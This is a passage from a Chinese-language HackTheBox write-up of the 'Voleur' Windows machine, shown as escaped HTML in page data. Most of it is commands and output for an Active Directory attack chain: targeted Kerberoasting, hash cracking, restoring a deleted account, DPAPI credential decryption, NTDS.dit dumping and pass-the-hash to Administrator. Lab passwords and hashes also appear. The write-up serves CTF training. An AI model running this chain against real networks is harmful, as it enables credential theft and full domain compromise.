Users\u003c/td\u003e\n\u003ctd\u003eLeaver. Password was reset to NightT1meP1dg3on14 and account deleted.\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eJeremy.Combs\u003c/td\u003e\n\u003ctd\u003eThird-Line Support Technician\u003c/td\u003e\n\u003ctd\u003eRemote Management Users.\u003c/td\u003e\n\u003ctd\u003eHas access to Software folder.\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eAdministrator\u003c/td\u003e\n\u003ctd\u003eAdministrator\u003c/td\u003e\n\u003ctd\u003eDomain Admin\u003c/td\u003e\n\u003ctd\u003eNot to be used for daily tasks!\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eService Accounts\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003esvc_backup\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003ctd\u003eWindows Backup\u003c/td\u003e\n\u003ctd\u003eSpeak to Jeremy!\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003esvc_ldap\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003ctd\u003eLDAP Services\u003c/td\u003e\n\u003ctd\u003eP/W - M1XyC9pW7qT5Vn\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003esvc_iis\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003ctd\u003eIIS Administration\u003c/td\u003e\n\u003ctd\u003eP/W - N5pXyW1VqM7CZ8\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003esvc_winrm\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003ctd\u003eRemote Management\u003c/td\u003e\n\u003ctd\u003eNeed to ask Lacey as she reset this recently.\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2\u003e\u003cstrong\u003eTargeted Kerberoasting\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003e我们拥有了\u003ccode\u003esvc_ldap\u003c/code\u003e 和 \u003ccode\u003esvc_iis\u003c/code\u003e 的密码\u003c/p\u003e\n\u003cp\u003e并且 \u003ccode\u003esvc_ldap\u003c/code\u003e 拥有对 \u003ccode\u003esvc_winrm\u003c/code\u003e  的 \u003ccode\u003eWirteSPN\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以使用 \u003ccode\u003eTargeted Kerberoasting\u003c/code\u003e 攻击，Tools：\u003ca href=\"https://github.com/ShutdownRepo/targetedKerberoast\"\u003ehttps://github.com/ShutdownRepo/targetedKerberoast\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur getTGT.py voleur.htb/svc_ldap:\u003cspan class=\"hljs-string\"\u003e'M1XyC9pW7qT5Vn'\u003c/span\u003e -dc-ip 10.10.11.76 -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e svc_ldap.ccache\n\n➜  Voleur \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=svc_ldap.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython targetedKerberoast.py -v -d voleur.htb --dc-ip 10.10.11.76 --dc-host dc.voleur.htb -u svc_ldap -k --no-pass\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePS：不清楚为什么\u003ccode\u003etodd.wolfe\u003c/code\u003e 被删掉了还能拿到，可能是被其他人恢复了，题目应该是要我们恢复账户的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003ehashcat\u003c/code\u003e破解\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  targetedKerberoast hashcat -h | grep Kerberos\n  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol\n  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol\n  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol\n  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol\n  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol\n  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol\n   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol\n  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol\n  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur hashcat -m 13100 kerberos_TGS_23 /usr/share/wordlists/rockyou.txt \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后可以拿到\u003ccode\u003esvc_winrm\u003c/code\u003e 的密码 \u003ccode\u003eAFireInsidedeOzarctica980219afi\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试\u003ccode\u003ewinrm\u003c/code\u003e登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur getTGT.py voleur.htb/svc_winrm:\u003cspan class=\"hljs-string\"\u003e'AFireInsidedeOzarctica980219afi'\u003c/span\u003e -dc-ip 10.10.11.76 -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e svc_winrm.ccache\n\n➜  Voleur \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=svc_winrm.ccache \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\svc_winrm\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\nf32246ed77a6xxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e恢复账户\u003c/h2\u003e\n\u003cp\u003e之前的\u003ccode\u003exlsx\u003c/code\u003e中有被删除的用户\u003ccode\u003eTodd.Wolfe\u003c/code\u003e，我们查看一下是否存在\u003c/p\u003e\n\u003cp\u003e新版本中的 \u003ccode\u003eBloodyAD\u003c/code\u003e可以对已删除的用户进行恢复了，免去了很多操作\u003c/p\u003e\n\u003cp\u003e侦查是否有被删除用户：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// 通过 RunasCs.exe 获得的 Shell\nPS C:\\Windows\\system32\u003e Get-ADObject -Filter \u003cspan class=\"hljs-string\"\u003e'isDeleted -eq $true'\u003c/span\u003e -IncludeDeletedObjects\nGet-ADObject -Filter \u003cspan class=\"hljs-string\"\u003e'isDeleted -eq $true'\u003c/span\u003e -IncludeDeletedObjects\n\nDeleted           : True\nDistinguishedName : CN=Deleted Objects,DC=voleur,DC=htb\nName              : Deleted Objects\nObjectClass       : container\nObjectGUID        : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8\n\nDeleted           : True\nDistinguishedName : CN=Todd Wolfe\\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb\nName              : Todd Wolfe\n                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db\nObjectClass       : user\nObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// 通过 BloodyAD\n➜  Voleur bloodyAD -d voleur.htb --host dc.voleur.htb -u svc_ldap -k get search --filter \u003cspan class=\"hljs-string\"\u003e\"(isDeleted=TRUE)\"\u003c/span\u003e --attr distinguishedName -c 1.2.840.113556.1.4.2064 |grep Todd\ndistinguishedName: CN=Todd Wolfe\\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003eBloodyAD\u003c/code\u003e恢复账户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur bloodyAD -d voleur.htb --host dc.voleur.htb -u svc_ldap -k \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e restore todd.wolfe \n[+] todd.wolfe has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e恢复后，我们将\u003ccode\u003eBloodHound\u003c/code\u003e数据更新一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur bloodhound-python -k -d \u003cspan class=\"hljs-string\"\u003e'voleur.htb'\u003c/span\u003e -ns 10.10.11.76 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'DC.voleur.htb'\u003c/span\u003e -u todd.wolfe -p NightT1meP1dg3on14 \nINFO: BloodHound.py \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: voleur.htb\nINFO: Using TGT from cache\nWARNING: Username \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e ccache file does not match supplied username! svc_ldap@VOLEUR.HTB != todd.wolfe@VOLEUR.HTB\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nINFO: Connecting to LDAP server: DC.voleur.htb\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC.voleur.htb\nINFO: Found 13 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 56 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 5 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC.voleur.htb\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00M 10S\nINFO: Compressing output into 20250707211514_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003egetTGT.py voleur.htb/todd.wolfe:\u003cspan class=\"hljs-string\"\u003e'NightT1meP1dg3on14'\u003c/span\u003e -dc-ip 10.10.11.76 -k \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eDPAPI\u003c/h2\u003e\n\u003cp\u003e我们下一个用户应该是\u003ccode\u003eJeremy.Combs\u003c/code\u003e 因为他有 \u003ccode\u003eHas access to Software folder.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e我们从\u003ccode\u003etodd.wolfe\u003c/code\u003e寻找可以横向的方法\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以看到\u003ccode\u003etodd\u003c/code\u003e属于\u003ccode\u003eSECOND_LINE\u003c/code\u003e ，看一下\u003ccode\u003eSMB\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=todd.wolfe.ccache\n\n➜  Voleur nxc smb DC.voleur.htb -u todd.wolfe -d voleur.htb -k --use-kcache --smb-timeout 9999\nSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.voleur.htb   445    DC               [+] voleur.htb\\todd.wolfe from ccache \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003esmbclient.py\u003c/code\u003e 进行连接，\u003ccode\u003enxc\u003c/code\u003e会有点问题\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur smbclient.py -k DC.VOLEUR.HTB\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\nType \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e list of commands\n\u003cspan class=\"hljs-comment\"\u003e# shares\u003c/span\u003e\nADMIN$\nC$\nFinance\nHR\nIPC$\nIT\nNETLOGON\nSYSVOL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e貌似偶\u003ccode\u003eDPAPI\u003c/code\u003e可以打（其实在\u003ccode\u003esvc_ldap\u003c/code\u003e用户中也有\u003ccode\u003eDPAPI\u003c/code\u003e）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# use IT\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# pwd\u003c/span\u003e\n/Second-Line Support/Archived Users/todd.wolfe/AppDAta/Roaming/Microsoft/Credentials\n\u003cspan class=\"hljs-comment\"\u003e# ls\u003c/span\u003e\ndrw-rw-rw-          0  Wed Jan 29 23:13:09 2025 .\ndrw-rw-rw-          0  Wed Jan 29 23:13:09 2025 ..\n-rw-rw-rw-        398  Wed Jan 29 21:13:50 2025 772275FAD58525253490A9B0039791D3\n\n\u003cspan class=\"hljs-comment\"\u003e# pwd\u003c/span\u003e\n/Second-Line Support/Archived Users/todd.wolfe/AppDAta/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110\n\u003cspan class=\"hljs-comment\"\u003e# ls\u003c/span\u003e\ndrw-rw-rw-          0  Wed Jan 29 23:13:09 2025 .\ndrw-rw-rw-          0  Wed Jan 29 23:13:09 2025 ..\n-rw-rw-rw-        740  Wed Jan 29 21:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88\n-rw-rw-rw-        900  Wed Jan 29 20:53:08 2025 BK-VOLEUR\n-rw-rw-rw-         24  Wed Jan 29 20:53:08 2025 Preferred\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将两个文件\u003ccode\u003eget\u003c/code\u003e下来\u003c/p\u003e\n\u003cp\u003e尝试\u003ccode\u003eDPAPI\u003c/code\u003e ：\u003ca href=\"https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#practice\"\u003ehttps://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#practice\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到\u003ccode\u003ejeremy.combs\u003c/code\u003e 账户密码 \u003ccode\u003eqT3V9pLXyN7W4m\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003eNTDS\u003c/h2\u003e\n\u003cp\u003e通过表格能知道 \u003ccode\u003ejeremy\u003c/code\u003e 拥有 \u003ccode\u003eHas access to Software folder.\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003egetTGT.py voleur.htb/jeremy.combs:\u003cspan class=\"hljs-string\"\u003e'qT3V9pLXyN7W4m'\u003c/span\u003e -dc-ip 10.10.11.76 -k\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=jeremy.combs.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e继续查看\u003ccode\u003eSMB\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur smbclient.py -k DC.VOLEUR.HTB\n\u003cspan class=\"hljs-comment\"\u003e# use IT\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# pwd\u003c/span\u003e\n/Third-Line Support\n\u003cspan class=\"hljs-comment\"\u003e# ls\u003c/span\u003e\ndrw-rw-rw-          0  Fri Jan 31 00:11:29 2025 .\ndrw-rw-rw-          0  Wed Jan 29 17:10:01 2025 ..\n-rw-rw-rw-       2602  Fri Jan 31 00:11:29 2025 id_rsa\n-rw-rw-rw-        186  Fri Jan 31 00:07:35 2025 Note.txt.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eNote.txt.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e Note.txt.txt   \nJeremy,\n\nI\u003cspan class=\"hljs-string\"\u003e've had enough of Windows Backup! I'\u003c/span\u003eve part configured WSL to see \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e we can utilize any of the backup tools from Linux.\n\nPlease see what you can \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e up.\n\nThanks,\n\nAdmin# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后\u003ccode\u003eid_rsa\u003c/code\u003e是\u003ccode\u003eSSH\u003c/code\u003e私钥，给了私钥，那么就应该可以进行\u003ccode\u003eSSH\u003c/code\u003e登录，用户和\u003ccode\u003ebackup\u003c/code\u003e有关的\u003c/p\u003e\n\u003cp\u003e那么就是\u003ccode\u003esvc_backup\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是没有发现\u003ccode\u003eSSH\u003c/code\u003e端口，重新扫描一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur nmap -sT -min-rate 5000 -p- 10.10.11.76\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 23:10 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e voleur.htb (10.10.11.76)\nHost is up (0.058s latency).\nNot shown: 65516 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n2222/tcp  open  EtherNetIP-1\n3268/tcp  open  globalcatLDAP\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur nmap -sT -A -p 2222 10.10.11.76\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 23:11 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e voleur.htb (10.10.11.76)\nHost is up (0.047s latency).\n\nPORT     STATE SERVICE VERSION\n2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 42:40:39:30:d6:\u003cspan class=\"hljs-built_in\"\u003efc\u003c/span\u003e:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)\n|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e:94 (ECDSA)\n|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e2222\u003c/code\u003e是\u003ccode\u003eSSH\u003c/code\u003e的端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在\u003ccode\u003e/mnt\u003c/code\u003e中有\u003ccode\u003ec\u003c/code\u003e盘的备份\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esvc_backup@DC:/mnt$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 0\ndrwxr-xr-x 1 root       root       4096 Jan 30 03:46 .\ndrwxr-xr-x 1 root       root       4096 Jan 30 03:46 ..\ndrwxrwxrwx 1 svc_backup svc_backup 4096 Jun 30 14:08 c\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e/IT/Third-Line Support/Backups\u003c/code\u003e 中有\u003ccode\u003eNTDS\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esvc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 0\ndrwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 08:11  .\ndr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 08:11  ..\ndrwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 03:49 \u003cspan class=\"hljs-string\"\u003e'Active Directory'\u003c/span\u003e\ndrwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 03:49  registry\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esvc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e Active\\ Directory/ -al\ntotal 24592\ndrwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 03:49 .\ndrwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 08:11 ..\n-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30 03:49 ntds.dit\n-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30 03:49 ntds.jfm\nsvc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e registry/ -al\ntotal 17952\ndrwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 03:49 .\ndrwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 08:11 ..\n-rwxrwxrwx 1 svc_backup svc_backup    32768 Jan 30 03:30 SECURITY\n-rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30 03:30 SYSTEM\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e转储出去，使用\u003ccode\u003esecretdump\u003c/code\u003e转储出来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur getTGT.py voleur.htb/administrator -hashes \u003cspan class=\"hljs-string\"\u003e'aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2'\u003c/span\u003e -dc-ip 10.10.11.76 -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e administrator.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e总体不难，但是步骤会多点，而且\u003ccode\u003eSMB\u003c/code\u003e不太稳定，总是爆红…\u003c/p\u003e","title":"HackTheBox - Season8 - Voleur","date":"2025-07-07","updated":"2025-07-07","tags":["HackTheBox","Windows","BloodyAD","NTDS","TargetedKerberoasting","DPAPI","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Voleur\n\n https://app.hackthebox.com/machines/Voleur | `Window` | `Medium`\n \n\n\n\nMachine Information ：As is common in real life Windows pentests, you will start the Voleur box with credentials...","isEncrypted":true}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxSeason8 - Voleur"},"buildId":"tEwxZSUgfxATz3JXeNydL","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>